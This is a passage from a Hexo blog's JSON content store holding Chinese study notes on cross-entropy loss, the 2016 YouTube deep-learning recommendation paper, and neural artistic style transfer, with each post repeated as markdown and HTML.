是一个离散随机变量，概率分布为 $p(x)=Pr(X=x)$，事件 $X=x_0$的信息量为 $I(x_0)=-log(p(x_0))$。从表达式可以看出，概率越大，信息量越小。概率越大，大家越会认为这一事件的发生几乎是确定的，这一事件的发生并不会引入太多信息量。</p>\n</li>\n<li><p>熵</p>\n<p>假设李华考试结果为一个0-1分布，{0不及格，1及格}，根据先验知识，由于李华不好好学习，考试及格(记为事件A)概率是$p(x_A)=0.1$，不及格的概率是0.9，则所有可能结果带来的额外信息的期望为</p>\n<p>$$H_A(x)=-[p(x_A)log(p(x_A))+(1-P(x_A))log(1-p(x_A))]=0.469$$</p>\n<p>如果还有一个张华成绩不好不坏，考试及格(记为时间B)概率是 $p(x_B)=0.5$</p>\n<p>$$H_B(x)=-[p(x_B)log(p(x_B))+(1-P(x_B))log(1-p(x_B))]=1$$</p>\n<p>说明在成绩出来前，猜出张华的结果比李华要难。熵越大，变量取值越不稳定。</p>\n</li>\n<li><p>交叉熵</p>\n<p>两个分布$p,q$，$CEH(p,q)=E_p[-logq]$</p>\n</li>\n</ul>\n<p>对于二分类问题，loss可以写为</p>\n<p>$$-\\frac{1}{m}\\sum^m_{i=1}(y^ilog\\, sigmod(x^i)+(1-y^i)log(1-sigmod(x^i)))$$</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># pytorch 提供了交叉熵函数</span></span><br><span class=\"line\">criterion = nn.CrossEntropyLoss()</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-4-参数初始化\"><a href=\"#1-4-参数初始化\" class=\"headerlink\" title=\"1.4 参数初始化\"></a>1.4 参数初始化</h3><ul>\n<li><strong>使用numpy初始化</strong></li>\n</ul>\n"},{"layout":"post","title":"Deep Neural Networks for YouTube Recommendations","_content":"\n> “2016 youtube 推荐系统”\n\n每天都在用网易云音乐听歌和youtube看视频。这篇论文GG介绍了其使用深度学习在youtube推荐系统的应用。\n\n## Overview\n\n系统的结构比较直观，分为 candidate generation 与 ranking。Candidate generation 负责从海量的数据集中 (百万级)，粗选一部分视频出来，接下来ranking负责对选出的视频 (百级) 进行精细处理，排名。\n\n## Candidate generation\n\n作者将推荐问题视为一个超大分类问题 (extreme multiclass classification)。问题为，在时刻$t$，为用户$U$，在上下文$C$，从视频库$V$中预测视频$i$的类别。\n\n$$P(w_t=i|U,C)=\\frac{e^{v_iu}}{\\sum_{j\\in V}e^{v_ju}}$$\n\n上式为一个softmax，$u\\in R^N$是<用户，上下文>的高位embedding，$v_j\\in R^N$是视频$j$的embedding。DNN需要做的，就是学习<用户，上下文>的高位embedding，$u$.\n\n![img](/images/in-post/post-blog-DNNytbmatch.png)\n\n### Feature\n\n+ Embedded video\n\n+ 搜索记录\n\n+ 人口统计信息：性别，年龄，地域\n\n+ “Example Age”\n\n  这一特征是为了应对视频的时效性。因为youtube每时每刻都有新的视频上传，用户还是会倾向于新的视频，而传统的使用用户过去信息训练的模型会对过去的行为有隐形的bias，基本上反应的是训练时段的观看喜好。于是将“age\"加入模型训练中。\n\n## Ranking\n\nRanking 的模型与 cadidate generation的基本一致，不同之处是training变成了weighted logistic regression对视频打分。\n\n![img](/images/in-post/post-blog-DNNytbrank.png)\n\n作者的目标是预测期望的观看时长，有点击的是正样本，使用观看时长加权，无点击的为负样本，使用单位权重unit weight (应该是1)。LR 学习到的odds (一个事件的**发生比**（英语：Odds）是该事件发生和不发生的比率)为：\n\n$$\\frac{\\sum{T_i}}{N-k}=\\frac{\\frac{\\sum{T_i}}{N}}{\\frac{N-k}{N}}=\\frac{E\\[T\\]}{1-P}=\\frac{E\\[T\\](1+P)}{1-P^2}$$\n\n$N$是总样本数，$k$是正样本数，$T_i$是第$i$个正样本的观看时长，$P$是点击率。实际中$P$较小，这样odds接近于$E[T]$，即期望观看时长。\n\n## Summary\n\n虽然用到了DNN，但感觉整个系统的重心还是在embedding上，还需要看一看embedding的东西。","source":"_posts/2018-04-24-DNNyoutube2016.markdown","raw":"---\nlayout:     post\ntitle:      \"Deep Neural Networks for YouTube Recommendations\"\ntags:\n    - Notes\n---\n\n> “2016 youtube 推荐系统”\n\n每天都在用网易云音乐听歌和youtube看视频。这篇论文GG介绍了其使用深度学习在youtube推荐系统的应用。\n\n## Overview\n\n系统的结构比较直观，分为 candidate generation 与 ranking。Candidate generation 负责从海量的数据集中 (百万级)，粗选一部分视频出来，接下来ranking负责对选出的视频 (百级) 进行精细处理，排名。\n\n## Candidate generation\n\n作者将推荐问题视为一个超大分类问题 (extreme multiclass classification)。问题为，在时刻$t$，为用户$U$，在上下文$C$，从视频库$V$中预测视频$i$的类别。\n\n$$P(w_t=i|U,C)=\\frac{e^{v_iu}}{\\sum_{j\\in V}e^{v_ju}}$$\n\n上式为一个softmax，$u\\in R^N$是<用户，上下文>的高位embedding，$v_j\\in R^N$是视频$j$的embedding。DNN需要做的，就是学习<用户，上下文>的高位embedding，$u$.\n\n![img](/images/in-post/post-blog-DNNytbmatch.png)\n\n### Feature\n\n+ Embedded video\n\n+ 搜索记录\n\n+ 人口统计信息：性别，年龄，地域\n\n+ “Example Age”\n\n  这一特征是为了应对视频的时效性。因为youtube每时每刻都有新的视频上传，用户还是会倾向于新的视频，而传统的使用用户过去信息训练的模型会对过去的行为有隐形的bias，基本上反应的是训练时段的观看喜好。于是将“age\"加入模型训练中。\n\n## Ranking\n\nRanking 的模型与 cadidate generation的基本一致，不同之处是training变成了weighted logistic regression对视频打分。\n\n![img](/images/in-post/post-blog-DNNytbrank.png)\n\n作者的目标是预测期望的观看时长，有点击的是正样本，使用观看时长加权，无点击的为负样本，使用单位权重unit weight (应该是1)。LR 学习到的odds (一个事件的**发生比**（英语：Odds）是该事件发生和不发生的比率)为：\n\n$$\\frac{\\sum{T_i}}{N-k}=\\frac{\\frac{\\sum{T_i}}{N}}{\\frac{N-k}{N}}=\\frac{E\\[T\\]}{1-P}=\\frac{E\\[T\\](1+P)}{1-P^2}$$\n\n$N$是总样本数，$k$是正样本数，$T_i$是第$i$个正样本的观看时长，$P$是点击率。实际中$P$较小，这样odds接近于$E[T]$，即期望观看时长。\n\n## Summary\n\n虽然用到了DNN，但感觉整个系统的重心还是在embedding上，还需要看一看embedding的东西。","slug":"DNNyoutube2016","published":1,"date":"2018-04-23T16:00:00.000Z","updated":"2018-04-24T12:29:14.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizbd000srikeqtl8e18s","content":"<blockquote>\n<p>“2016 youtube 推荐系统”</p>\n</blockquote>\n<p>每天都在用网易云音乐听歌和youtube看视频。这篇论文GG介绍了其使用深度学习在youtube推荐系统的应用。</p>\n<h2 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h2><p>系统的结构比较直观，分为 candidate generation 与 ranking。Candidate generation 负责从海量的数据集中 (百万级)，粗选一部分视频出来，接下来ranking负责对选出的视频 (百级) 进行精细处理，排名。</p>\n<h2 id=\"Candidate-generation\"><a href=\"#Candidate-generation\" class=\"headerlink\" title=\"Candidate generation\"></a>Candidate generation</h2><p>作者将推荐问题视为一个超大分类问题 (extreme multiclass classification)。问题为，在时刻$t$，为用户$U$，在上下文$C$，从视频库$V$中预测视频$i$的类别。</p>\n<p>$$P(w_t=i|U,C)=\\frac{e^{v_iu}}{\\sum_{j\\in V}e^{v_ju}}$$</p>\n<p>上式为一个softmax，$u\\in R^N$是&lt;用户，上下文&gt;的高位embedding，$v_j\\in R^N$是视频$j$的embedding。DNN需要做的，就是学习&lt;用户，上下文&gt;的高位embedding，$u$.</p>\n<p><img src=\"/images/in-post/post-blog-DNNytbmatch.png\" alt=\"img\"></p>\n<h3 id=\"Feature\"><a href=\"#Feature\" class=\"headerlink\" title=\"Feature\"></a>Feature</h3><ul>\n<li><p>Embedded video</p>\n</li>\n<li><p>搜索记录</p>\n</li>\n<li><p>人口统计信息：性别，年龄，地域</p>\n</li>\n<li><p>“Example Age”</p>\n<p>这一特征是为了应对视频的时效性。因为youtube每时每刻都有新的视频上传，用户还是会倾向于新的视频，而传统的使用用户过去信息训练的模型会对过去的行为有隐形的bias，基本上反应的是训练时段的观看喜好。于是将“age”加入模型训练中。</p>\n</li>\n</ul>\n<h2 id=\"Ranking\"><a href=\"#Ranking\" class=\"headerlink\" title=\"Ranking\"></a>Ranking</h2><p>Ranking 的模型与 cadidate generation的基本一致，不同之处是training变成了weighted logistic regression对视频打分。</p>\n<p><img src=\"/images/in-post/post-blog-DNNytbrank.png\" alt=\"img\"></p>\n<p>作者的目标是预测期望的观看时长，有点击的是正样本，使用观看时长加权，无点击的为负样本，使用单位权重unit weight (应该是1)。LR 学习到的odds (一个事件的<strong>发生比</strong>（英语：Odds）是该事件发生和不发生的比率)为：</p>\n<p>$$\\frac{\\sum{T_i}}{N-k}=\\frac{\\frac{\\sum{T_i}}{N}}{\\frac{N-k}{N}}=\\frac{E[T]}{1-P}=\\frac{E[T](1+P)}{1-P^2}$$</p>\n<p>$N$是总样本数，$k$是正样本数，$T_i$是第$i$个正样本的观看时长，$P$是点击率。实际中$P$较小，这样odds接近于$E[T]$，即期望观看时长。</p>\n<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>虽然用到了DNN，但感觉整个系统的重心还是在embedding上，还需要看一看embedding的东西。</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“2016 youtube 推荐系统”</p>\n</blockquote>\n<p>每天都在用网易云音乐听歌和youtube看视频。这篇论文GG介绍了其使用深度学习在youtube推荐系统的应用。</p>\n<h2 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h2><p>系统的结构比较直观，分为 candidate generation 与 ranking。Candidate generation 负责从海量的数据集中 (百万级)，粗选一部分视频出来，接下来ranking负责对选出的视频 (百级) 进行精细处理，排名。</p>\n<h2 id=\"Candidate-generation\"><a href=\"#Candidate-generation\" class=\"headerlink\" title=\"Candidate generation\"></a>Candidate generation</h2><p>作者将推荐问题视为一个超大分类问题 (extreme multiclass classification)。问题为，在时刻$t$，为用户$U$，在上下文$C$，从视频库$V$中预测视频$i$的类别。</p>\n<p>$$P(w_t=i|U,C)=\\frac{e^{v_iu}}{\\sum_{j\\in V}e^{v_ju}}$$</p>\n<p>上式为一个softmax，$u\\in R^N$是&lt;用户，上下文&gt;的高位embedding，$v_j\\in R^N$是视频$j$的embedding。DNN需要做的，就是学习&lt;用户，上下文&gt;的高位embedding，$u$.</p>\n<p><img src=\"/images/in-post/post-blog-DNNytbmatch.png\" alt=\"img\"></p>\n<h3 id=\"Feature\"><a href=\"#Feature\" class=\"headerlink\" title=\"Feature\"></a>Feature</h3><ul>\n<li><p>Embedded video</p>\n</li>\n<li><p>搜索记录</p>\n</li>\n<li><p>人口统计信息：性别，年龄，地域</p>\n</li>\n<li><p>“Example Age”</p>\n<p>这一特征是为了应对视频的时效性。因为youtube每时每刻都有新的视频上传，用户还是会倾向于新的视频，而传统的使用用户过去信息训练的模型会对过去的行为有隐形的bias，基本上反应的是训练时段的观看喜好。于是将“age”加入模型训练中。</p>\n</li>\n</ul>\n<h2 id=\"Ranking\"><a href=\"#Ranking\" class=\"headerlink\" title=\"Ranking\"></a>Ranking</h2><p>Ranking 的模型与 cadidate generation的基本一致，不同之处是training变成了weighted logistic regression对视频打分。</p>\n<p><img src=\"/images/in-post/post-blog-DNNytbrank.png\" alt=\"img\"></p>\n<p>作者的目标是预测期望的观看时长，有点击的是正样本，使用观看时长加权，无点击的为负样本，使用单位权重unit weight (应该是1)。LR 学习到的odds (一个事件的<strong>发生比</strong>（英语：Odds）是该事件发生和不发生的比率)为：</p>\n<p>$$\\frac{\\sum{T_i}}{N-k}=\\frac{\\frac{\\sum{T_i}}{N}}{\\frac{N-k}{N}}=\\frac{E[T]}{1-P}=\\frac{E[T](1+P)}{1-P^2}$$</p>\n<p>$N$是总样本数，$k$是正样本数，$T_i$是第$i$个正样本的观看时长，$P$是点击率。实际中$P$较小，这样odds接近于$E[T]$，即期望观看时长。</p>\n<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>虽然用到了DNN，但感觉整个系统的重心还是在embedding上，还需要看一看embedding的东西。</p>\n"},{"layout":"post","title":"A Neural Algorithm of Artistic Style","_content":"\n> “Deep style transfer”\n\n大概是两年前，有一篇照片风格迁移的论文火的不得了，名字记不得了，文中的例子是将图片迁移为梵高风格的画风，当时觉得这东西很厉害，而且还有一个叫Prisma的应用在移动端实现了图片的风格迁移，各种画风随意生成，也是厉害的不行。\n\n今天这篇论文应该算是此类问题的开篇鼻祖，看完觉得基础原理其实也挺简单的。\n\n## Overview\n\n所谓风格迁移，就是一张图片A作为输入，一张图片B作为风格，比如梵高的抽象油画，然后生成一张图片C，就好像C是A根据B画出来的一样。\n\n也就是说图片C看起来既像A又像B，根据这句朴素的话语，我们可以引出这篇论文的算法。我们定义两个距离，一个称作内容(content)距离 $D_c$，一个称为风格(style)距离 $D_s$，内容距离用来衡量图片C和内容A的差异，风格距离用来衡量图片C和风格B的差异。我们的最终目的是希望生成的C可以同时最小化 $D_c$ 和 $D_s$，这样就可以保证C在内容上和A接近同时风格上又和B接近。\n\n## Content and Style Distance\n\n记卷积网络为 $C_{nn}$，输入图像为 $X$，则 $C_{nn}(X)$ 表示网络的输入为 $X$。记以 $X$ 为输入，第 $L$ 层的feature map为 $F_{XL}$，这里将所有的feature拼接为一个一维向量。\n\n+ **内容距离**\n\n若 $Y$ 是另一个与 $X$ 同大小的输入，则内容距离定义如下：\n\n$$D^L_C(X,Y)=||F_{XL}-F_{YL}||^2=\\sum_i(F_{XL}(i)-F_{YL}(i))^2$$\n\n，$F_{XL}(i))$ 表示 $F_{XL}$ 的第 $i$ 个元素。\n\n+ **风格距离**\n\n计算风格距离，首先要定义风格。输入 $X$ 在第 $L$ 层的风格由Gram矩阵计算得出。\n\n记第 $L$ 层的feature map个数为 $K$，$F^k_{XL}$ 表示第$k$个feature map的向量化表示，则Gram矩阵的大小为 $K*K$，且\n\n$$G_{XL}(k,l)=<F^k_{XL},F^l_{XL}>=\\sum_iF^k_{XL}(i)*F^l_{XL}(i)$$\n\n也就是说$G_{XL}$ 是第$L$层feature map的相关矩阵。\n\n接下来是计算风格距离。记 $Y$ 是另一张任意大小的图片，第 $L$ 层的风格距离定义为：\n\n$$D^L_S(X,Y)=||G_{XL}-G_{YL}||^2=\\sum_{k,l}(G_{XL}(k,l)-G_{YL}(k,l))^2$$\n\n## Train\n\n作者采用的是VGG19 (16 Conv + 5 Pooling) 模型。当然Pytorch提供了VGG19的模型，直接下载使用就可以了。\n\nVGG19有19层，都进行上述计算的话，计算量是很大的，我们可以选择在想要的层计算上述两个距离。\n\n$$\\nabla_{total}(X,C,S)=\\sum_{L_C}w_{CL_C}\\nabla_{content}^{L_C}(X,C)+\\sum_{L_S}w_{SL_S}\\nabla^{L_S}_{style}(X,S)$$\n\n$L_C$ 和 $L_S$分别是想要计算内容距离和风格距离的层，$w_{CL_C}$和 $w_{SL_S}$是所对应层的参数。然后对 $X$ 进行梯度下降\n\n$$X \\leftarrow X-\\alpha \\nabla_{total}(X,C,S)$$\n\n## Result\n\nCPU真的跑的好慢啊…(ಥ_ಥ) \n\n| ![Pic](/images/in-post/post-blog-DNNartstyle3.jpg) | ![Pic](/images/in-post/post-blog-DNNartstyle1.png) | ![Pic](/images/in-post/post-blog-DNNartstyle4.png) |\n| -------------------------------------------------- | -------------------------------------------------- | -------------------------------------------------- |\n| ![Pic](/images/in-post/post-blog-DNNartstyle0.jpg) | ![Pic](/images/in-post/post-blog-DNNartstyle1.png) | ![Pic](/images/in-post/post-blog-DNNartstyle2.png) |\n| ![Pic](/images/in-post/post-blog-DNNartstyle0.jpg) | ![Pic](/images/in-post/post-blog-DNNartstyle5.jpg) | ![Pic](/images/in-post/post-blog-DNNartstyle6.png) |\n\n用于训练图片源于网络，侵删\n\n## Code\n\n[github](https://github.com/miyunluo/pytorch-beginner/tree/master/neural-artistic-style)","source":"_posts/2018-05-06-NeuralArtisticStyle.markdown","raw":"---\nlayout:     post\ntitle:      \"A Neural Algorithm of Artistic Style\"\ntags:\n    - Python\n---\n\n> “Deep style transfer”\n\n大概是两年前，有一篇照片风格迁移的论文火的不得了，名字记不得了，文中的例子是将图片迁移为梵高风格的画风，当时觉得这东西很厉害，而且还有一个叫Prisma的应用在移动端实现了图片的风格迁移，各种画风随意生成，也是厉害的不行。\n\n今天这篇论文应该算是此类问题的开篇鼻祖，看完觉得基础原理其实也挺简单的。\n\n## Overview\n\n所谓风格迁移，就是一张图片A作为输入，一张图片B作为风格，比如梵高的抽象油画，然后生成一张图片C，就好像C是A根据B画出来的一样。\n\n也就是说图片C看起来既像A又像B，根据这句朴素的话语，我们可以引出这篇论文的算法。我们定义两个距离，一个称作内容(content)距离 $D_c$，一个称为风格(style)距离 $D_s$，内容距离用来衡量图片C和内容A的差异，风格距离用来衡量图片C和风格B的差异。我们的最终目的是希望生成的C可以同时最小化 $D_c$ 和 $D_s$，这样就可以保证C在内容上和A接近同时风格上又和B接近。\n\n## Content and Style Distance\n\n记卷积网络为 $C_{nn}$，输入图像为 $X$，则 $C_{nn}(X)$ 表示网络的输入为 $X$。记以 $X$ 为输入，第 $L$ 层的feature map为 $F_{XL}$，这里将所有的feature拼接为一个一维向量。\n\n+ **内容距离**\n\n若 $Y$ 是另一个与 $X$ 同大小的输入，则内容距离定义如下：\n\n$$D^L_C(X,Y)=||F_{XL}-F_{YL}||^2=\\sum_i(F_{XL}(i)-F_{YL}(i))^2$$\n\n，$F_{XL}(i))$ 表示 $F_{XL}$ 的第 $i$ 个元素。\n\n+ **风格距离**\n\n计算风格距离，首先要定义风格。输入 $X$ 在第 $L$ 层的风格由Gram矩阵计算得出。\n\n记第 $L$ 层的feature map个数为 $K$，$F^k_{XL}$ 表示第$k$个feature map的向量化表示，则Gram矩阵的大小为 $K*K$，且\n\n$$G_{XL}(k,l)=<F^k_{XL},F^l_{XL}>=\\sum_iF^k_{XL}(i)*F^l_{XL}(i)$$\n\n也就是说$G_{XL}$ 是第$L$层feature map的相关矩阵。\n\n接下来是计算风格距离。记 $Y$ 是另一张任意大小的图片，第 $L$ 层的风格距离定义为：\n\n$$D^L_S(X,Y)=||G_{XL}-G_{YL}||^2=\\sum_{k,l}(G_{XL}(k,l)-G_{YL}(k,l))^2$$\n\n## Train\n\n作者采用的是VGG19 (16 Conv + 5 Pooling) 模型。当然Pytorch提供了VGG19的模型，直接下载使用就可以了。\n\nVGG19有19层，都进行上述计算的话，计算量是很大的，我们可以选择在想要的层计算上述两个距离。\n\n$$\\nabla_{total}(X,C,S)=\\sum_{L_C}w_{CL_C}\\nabla_{content}^{L_C}(X,C)+\\sum_{L_S}w_{SL_S}\\nabla^{L_S}_{style}(X,S)$$\n\n$L_C$ 和 $L_S$分别是想要计算内容距离和风格距离的层，$w_{CL_C}$和 $w_{SL_S}$是所对应层的参数。然后对 $X$ 进行梯度下降\n\n$$X \\leftarrow X-\\alpha \\nabla_{total}(X,C,S)$$\n\n## Result\n\nCPU真的跑的好慢啊…(ಥ_ಥ) \n\n| ![Pic](/images/in-post/post-blog-DNNartstyle3.jpg) | ![Pic](/images/in-post/post-blog-DNNartstyle1.png) | ![Pic](/images/in-post/post-blog-DNNartstyle4.png) |\n| -------------------------------------------------- | -------------------------------------------------- | -------------------------------------------------- |\n| ![Pic](/images/in-post/post-blog-DNNartstyle0.jpg) | ![Pic](/images/in-post/post-blog-DNNartstyle1.png) | ![Pic](/images/in-post/post-blog-DNNartstyle2.png) |\n| ![Pic](/images/in-post/post-blog-DNNartstyle0.jpg) | ![Pic](/images/in-post/post-blog-DNNartstyle5.jpg) | ![Pic](/images/in-post/post-blog-DNNartstyle6.png) |\n\n用于训练图片源于网络，侵删\n\n## Code\n\n[github](https://github.com/miyunluo/pytorch-beginner/tree/master/neural-artistic-style)","slug":"NeuralArtisticStyle","published":1,"date":"2018-05-05T16:00:00.000Z","updated":"2018-05-22T10:33:05.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizbe000trikebiazb2bo","content":"<blockquote>\n<p>“Deep style transfer”</p>\n</blockquote>\n<p>大概是两年前，有一篇照片风格迁移的论文火的不得了，名字记不得了，文中的例子是将图片迁移为梵高风格的画风，当时觉得这东西很厉害，而且还有一个叫Prisma的应用在移动端实现了图片的风格迁移，各种画风随意生成，也是厉害的不行。</p>\n<p>今天这篇论文应该算是此类问题的开篇鼻祖，看完觉得基础原理其实也挺简单的。</p>\n<h2 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h2><p>所谓风格迁移，就是一张图片A作为输入，一张图片B作为风格，比如梵高的抽象油画，然后生成一张图片C，就好像C是A根据B画出来的一样。</p>\n<p>也就是说图片C看起来既像A又像B，根据这句朴素的话语，我们可以引出这篇论文的算法。我们定义两个距离，一个称作内容(content)距离 $D_c$，一个称为风格(style)距离 $D_s$，内容距离用来衡量图片C和内容A的差异，风格距离用来衡量图片C和风格B的差异。我们的最终目的是希望生成的C可以同时最小化 $D_c$ 和 $D_s$，这样就可以保证C在内容上和A接近同时风格上又和B接近。</p>\n<h2 id=\"Content-and-Style-Distance\"><a href=\"#Content-and-Style-Distance\" class=\"headerlink\" title=\"Content and Style Distance\"></a>Content and Style Distance</h2><p>记卷积网络为 $C_{nn}$，输入图像为 $X$，则 $C_{nn}(X)$ 表示网络的输入为 $X$。记以 $X$ 为输入，第 $L$ 层的feature map为 $F_{XL}$，这里将所有的feature拼接为一个一维向量。</p>\n<ul>\n<li><strong>内容距离</strong></li>\n</ul>\n<p>若 $Y$ 是另一个与 $X$ 同大小的输入，则内容距离定义如下：</p>\n<p>$$D^L_C(X,Y)=||F_{XL}-F_{YL}||^2=\\sum_i(F_{XL}(i)-F_{YL}(i))^2$$</p>\n<p>，$F_{XL}(i))$ 表示 $F_{XL}$ 的第 $i$ 个元素。</p>\n<ul>\n<li><strong>风格距离</strong></li>\n</ul>\n<p>计算风格距离，首先要定义风格。输入 $X$ 在第 $L$ 层的风格由Gram矩阵计算得出。</p>\n<p>记第 $L$ 层的feature map个数为 $K$，$F^k_{XL}$ 表示第$k$个feature map的向量化表示，则Gram矩阵的大小为 $K*K$，且</p>\n<p>$$G_{XL}(k,l)=&lt;F^k_{XL},F^l_{XL}&gt;=\\sum_iF^k_{XL}(i)*F^l_{XL}(i)$$</p>\n<p>也就是说$G_{XL}$ 是第$L$层feature map的相关矩阵。</p>\n<p>接下来是计算风格距离。记 $Y$ 是另一张任意大小的图片，第 $L$ 层的风格距离定义为：</p>\n<p>$$D^L_S(X,Y)=||G_{XL}-G_{YL}||^2=\\sum_{k,l}(G_{XL}(k,l)-G_{YL}(k,l))^2$$</p>\n<h2 id=\"Train\"><a href=\"#Train\" class=\"headerlink\" title=\"Train\"></a>Train</h2><p>作者采用的是VGG19 (16 Conv + 5 Pooling) 模型。当然Pytorch提供了VGG19的模型，直接下载使用就可以了。</p>\n<p>VGG19有19层，都进行上述计算的话，计算量是很大的，我们可以选择在想要的层计算上述两个距离。</p>\n<p>$$\\nabla_{total}(X,C,S)=\\sum_{L_C}w_{CL_C}\\nabla_{content}^{L_C}(X,C)+\\sum_{L_S}w_{SL_S}\\nabla^{L_S}_{style}(X,S)$$</p>\n<p>$L_C$ 和 $L_S$分别是想要计算内容距离和风格距离的层，$w_{CL_C}$和 $w_{SL_S}$是所对应层的参数。然后对 $X$ 进行梯度下降</p>\n<p>$$X \\leftarrow X-\\alpha \\nabla_{total}(X,C,S)$$</p>\n<h2 id=\"Result\"><a href=\"#Result\" class=\"headerlink\" title=\"Result\"></a>Result</h2><p>CPU真的跑的好慢啊…(ಥ_ಥ) </p>\n<table>\n<thead>\n<tr>\n<th><img src=\"/images/in-post/post-blog-DNNartstyle3.jpg\" alt=\"Pic\"></th>\n<th><img src=\"/images/in-post/post-blog-DNNartstyle1.png\" alt=\"Pic\"></th>\n<th><img src=\"/images/in-post/post-blog-DNNartstyle4.png\" alt=\"Pic\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle0.jpg\" alt=\"Pic\"></td>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle1.png\" alt=\"Pic\"></td>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle2.png\" alt=\"Pic\"></td>\n</tr>\n<tr>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle0.jpg\" alt=\"Pic\"></td>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle5.jpg\" alt=\"Pic\"></td>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle6.png\" alt=\"Pic\"></td>\n</tr>\n</tbody>\n</table>\n<p>用于训练图片源于网络，侵删</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><p><a href=\"https://github.com/miyunluo/pytorch-beginner/tree/master/neural-artistic-style\" target=\"_blank\" rel=\"noopener\">github</a></p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“Deep style transfer”</p>\n</blockquote>\n<p>大概是两年前，有一篇照片风格迁移的论文火的不得了，名字记不得了，文中的例子是将图片迁移为梵高风格的画风，当时觉得这东西很厉害，而且还有一个叫Prisma的应用在移动端实现了图片的风格迁移，各种画风随意生成，也是厉害的不行。</p>\n<p>今天这篇论文应该算是此类问题的开篇鼻祖，看完觉得基础原理其实也挺简单的。</p>\n<h2 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h2><p>所谓风格迁移，就是一张图片A作为输入，一张图片B作为风格，比如梵高的抽象油画，然后生成一张图片C，就好像C是A根据B画出来的一样。</p>\n<p>也就是说图片C看起来既像A又像B，根据这句朴素的话语，我们可以引出这篇论文的算法。我们定义两个距离，一个称作内容(content)距离 $D_c$，一个称为风格(style)距离 $D_s$，内容距离用来衡量图片C和内容A的差异，风格距离用来衡量图片C和风格B的差异。我们的最终目的是希望生成的C可以同时最小化 $D_c$ 和 $D_s$，这样就可以保证C在内容上和A接近同时风格上又和B接近。</p>\n<h2 id=\"Content-and-Style-Distance\"><a href=\"#Content-and-Style-Distance\" class=\"headerlink\" title=\"Content and Style Distance\"></a>Content and Style Distance</h2><p>记卷积网络为 $C_{nn}$，输入图像为 $X$，则 $C_{nn}(X)$ 表示网络的输入为 $X$。记以 $X$ 为输入，第 $L$ 层的feature map为 $F_{XL}$，这里将所有的feature拼接为一个一维向量。</p>\n<ul>\n<li><strong>内容距离</strong></li>\n</ul>\n<p>若 $Y$ 是另一个与 $X$ 同大小的输入，则内容距离定义如下：</p>\n<p>$$D^L_C(X,Y)=||F_{XL}-F_{YL}||^2=\\sum_i(F_{XL}(i)-F_{YL}(i))^2$$</p>\n<p>，$F_{XL}(i))$ 表示 $F_{XL}$ 的第 $i$ 个元素。</p>\n<ul>\n<li><strong>风格距离</strong></li>\n</ul>\n<p>计算风格距离，首先要定义风格。输入 $X$ 在第 $L$ 层的风格由Gram矩阵计算得出。</p>\n<p>记第 $L$ 层的feature map个数为 $K$，$F^k_{XL}$ 表示第$k$个feature map的向量化表示，则Gram矩阵的大小为 $K*K$，且</p>\n<p>$$G_{XL}(k,l)=&lt;F^k_{XL},F^l_{XL}&gt;=\\sum_iF^k_{XL}(i)*F^l_{XL}(i)$$</p>\n<p>也就是说$G_{XL}$ 是第$L$层feature map的相关矩阵。</p>\n<p>接下来是计算风格距离。记 $Y$ 是另一张任意大小的图片，第 $L$ 层的风格距离定义为：</p>\n<p>$$D^L_S(X,Y)=||G_{XL}-G_{YL}||^2=\\sum_{k,l}(G_{XL}(k,l)-G_{YL}(k,l))^2$$</p>\n<h2 id=\"Train\"><a href=\"#Train\" class=\"headerlink\" title=\"Train\"></a>Train</h2><p>作者采用的是VGG19 (16 Conv + 5 Pooling) 模型。当然Pytorch提供了VGG19的模型，直接下载使用就可以了。</p>\n<p>VGG19有19层，都进行上述计算的话，计算量是很大的，我们可以选择在想要的层计算上述两个距离。</p>\n<p>$$\\nabla_{total}(X,C,S)=\\sum_{L_C}w_{CL_C}\\nabla_{content}^{L_C}(X,C)+\\sum_{L_S}w_{SL_S}\\nabla^{L_S}_{style}(X,S)$$</p>\n<p>$L_C$ 和 $L_S$分别是想要计算内容距离和风格距离的层，$w_{CL_C}$和 $w_{SL_S}$是所对应层的参数。然后对 $X$ 进行梯度下降</p>\n<p>$$X \\leftarrow X-\\alpha \\nabla_{total}(X,C,S)$$</p>\n<h2 id=\"Result\"><a href=\"#Result\" class=\"headerlink\" title=\"Result\"></a>Result</h2><p>CPU真的跑的好慢啊…(ಥ_ಥ) </p>\n<table>\n<thead>\n<tr>\n<th><img src=\"/images/in-post/post-blog-DNNartstyle3.jpg\" alt=\"Pic\"></th>\n<th><img src=\"/images/in-post/post-blog-DNNartstyle1.png\" alt=\"Pic\"></th>\n<th><img src=\"/images/in-post/post-blog-DNNartstyle4.png\" alt=\"Pic\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><img 